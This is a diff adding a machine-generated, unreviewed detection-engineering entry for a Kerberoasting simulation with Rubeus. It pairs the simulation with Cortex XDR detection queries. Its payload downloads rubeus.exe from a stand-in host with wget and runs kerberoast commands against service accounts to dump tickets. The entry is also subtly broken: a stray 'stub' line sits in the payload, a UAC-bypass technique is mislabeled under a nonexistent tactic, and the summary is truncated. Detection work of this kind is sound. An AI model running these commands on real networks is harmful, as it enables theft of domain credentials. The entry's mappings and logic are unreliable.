@@ -1,0 +1,190 @@
+{
+  "id": "TTP-0000-0127",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Kerberoasting with Rubeus to Request Weakly-Encrypted Tickets",
+    "summary": "An attacker uses Rubeus to request Kerberos service tickets with weak encryption (DES) from a domain controller, which triggers the 'Multiple Weakly-Encrypted Kerberos Tickets Received' alert. Cortex ",
+    "description": "An attacker uses Rubeus to request Kerberos service tickets with weak encryption (DES) from a domain controller, which triggers the 'Multiple Weakly-Encrypted Kerberos Tickets Received' alert. Cortex should detect the execution of Rubeus and the subsequent network connections to the domain controller."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1548",
+        "subtechnique_id": "T1548.002",
+        "name": "T1548.002",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1078",
+        "subtechnique_id": "T1078.002",
+        "name": "Valid Accounts: Domain Accounts",
+        "tactic_ids": [
+          "TA0004",
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Privilege Escalation",
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1558",
+        "subtechnique_id": "T1558.003",
+        "name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget https://example.com/rubeus.exe -O C:\\temp\\rubeus.exe\nstub C:\\temp\\rubeus.exe\nC:\\temp\\rubeus.exe kerberoast /user:svc_account /outfile:ticket.kirbi\nC:\\temp\\rubeus.exe kerberoast /user:another_user /outfile:ticket2.kirbi\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Rubeus process execution",
+        "expected_value": "actor_process_image_name = 'rubeus.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to domain controller for ticket request",
+        "expected_value": "action_remote_ip = '192.0.2.1'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Rubeus Kerberoast Execution",
+        "description": "Detection of Rubeus.exe being executed with kerberoast command",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'rubeus.exe'\n| filter action_process_command_line contains 'kerberoast'",
+        "mitre_technique_ids": [
+          "T1548.002",
+          "T1078.002",
+          "T1558.003"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Multiple Weakly-Encrypted Tickets Requested",
+        "description": "Detection of multiple weakly-encrypted Kerberos tickets requested in short time window",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.1'\n| filter dst_port = 88\n| filter action_protocol = 'kerberos'\n| comp count() by actor_process_image_name\n| filter count() > 1",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Rubeus kerberoast command execution",
+        "mitre_technique_ids": [
+          "T1548.002",
+          "T1078.002",
+          "T1558.003"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect Weakly Encrypted Tickets",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.1'\n| filter dst_port = 88\n| filter action_protocol = 'kerberos'\n| comp count() by actor_process_image_name\n| filter count() > 1",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Multiple Weakly-Encrypted Kerberos Tickets Received; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/multiple-weakly-encrypted-kerberos-tickets-received"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Multiple Weakly-Encrypted Kerberos Tickets Received",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/multiple-weakly-encrypted-kerberos-tickets-received",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1548.002",
+      "url": "https://attack.mitre.org/techniques/T1548/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1078.002",
+      "url": "https://attack.mitre.org/techniques/T1078/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1558.003",
+      "url": "https://attack.mitre.org/techniques/T1558/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
